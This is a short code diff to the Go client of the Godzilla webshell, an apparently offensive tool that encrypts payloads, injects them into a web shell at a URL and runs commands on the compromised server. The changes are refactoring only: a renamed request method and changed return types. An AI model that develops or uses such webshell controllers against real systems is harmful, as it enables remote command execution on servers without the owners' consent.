@@ -128,7 +128,7 @@ func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
 	var enData []byte
 	if g.Script == shell.AspScript {
 		enData = godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
-		result, err := g.Client.DoRequest(g.Url, string(enData))
+		result, err := g.Client.DoHttpRequest(g.Url, string(enData))
 		if err != nil {
 			panic("EvalFunc1 error")
 		}
@@ -137,7 +137,7 @@ func (g *GodzillaInfo) sendPayload(payload []byte) []byte {
 	} else {
 		gzipData, _ := gzip.GzipCompress(payload)
 		enData = godzilla.Encrypto(gzipData, g.secretKey, g.Password, g.Crypto, g.Script)
-		result, err := g.Client.DoRequest(g.Url, string(enData))
+		result, err := g.Client.DoHttpRequest(g.Url, string(enData))
 		if err != nil {
 			panic("EvalFunc1 error")
 		}
@@ -184,7 +184,7 @@ func getParameter() *godzilla.Parameter {
 func (g *GodzillaInfo) InjectPayload() {
 	payload := g.GetPayload()
 	encrypt := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
-	_, err := g.Client.DoRequest(g.Url, string(encrypt))
+	_, err := g.Client.DoHttpRequest(g.Url, string(encrypt))
 	if err != nil {
 		panic("InjectPayload error")
 	}
@@ -202,7 +202,7 @@ func (g *GodzillaInfo) test() bool {
 }
 
 // 获取基础信息
-func (g *GodzillaInfo) getBasicsInfo() string {
+func (g *GodzillaInfo) getBasicsInfo() []byte {
 	parameter := getParameter()
 	basicsInfo := g.EvalFunc("", "getBasicsInfo", parameter)
 	//
@@ -211,7 +211,7 @@ func (g *GodzillaInfo) getBasicsInfo() string {
 	//g.currentDir = (String)pxMap.get("CurrentDir");
 	//g.currentUser = (String)pxMap.get("CurrentUser");
 	//g.osInfo = (String)pxMap.get("OsInfo");
-	return string(basicsInfo)
+	return basicsInfo
 }
 
 // 命令执行，这个地方的传参处理好复杂啊，我真的不行了,栓Q =_=!
@@ -509,9 +509,9 @@ func (g *GodzillaInfo) Ping(p ...shell.IParams) bool {
 
 func (g *GodzillaInfo) BasicInfo(p ...shell.IParams) shell.IResult {
 
-	return httpx.NewResult([]byte(g.getBasicsInfo()))
+	return NewResult(g.getBasicsInfo())
 }
 
 func (g *GodzillaInfo) CommandExec(c string) shell.IResult {
-	return httpx.NewResult([]byte(g.execCommand(c)))
+	return NewResult([]byte(g.execCommand(c)))
 }
